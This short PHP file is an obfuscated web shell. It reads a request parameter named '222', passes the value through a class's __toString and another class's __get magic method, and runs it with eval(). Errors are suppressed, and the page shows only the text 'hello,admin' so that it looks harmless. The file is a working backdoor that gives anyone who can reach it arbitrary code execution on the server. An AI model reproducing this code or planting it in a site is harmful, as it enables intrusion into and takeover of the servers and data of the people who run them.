	<?php
	// highlight_file(FILE);
	@session_start();
	@set_time_limit(0);
	error_reporting(0);

	class  GG {
		public function __toString()
		{
			$AAA = "$_REQUEST[222]";
			return $AAA;
		}
	}

	class AVASDAB {
		public $n=123;
		public function __get($name){
			// $class = "ReflectionMethod";
			$class = "";
			$cmd = BBB();
			// echo($cmd);
			eval($cmd);
		}
	}

	function BBB() {
		$AAA = new GG();
		$BBB = $AAA.'';
		$asciiA = "$BBB";
		// echo($asciiA);
		return $asciiA;
	}


	$a = new AVASDAB();
	$a->n;
	$a->m;
	?>hello,admin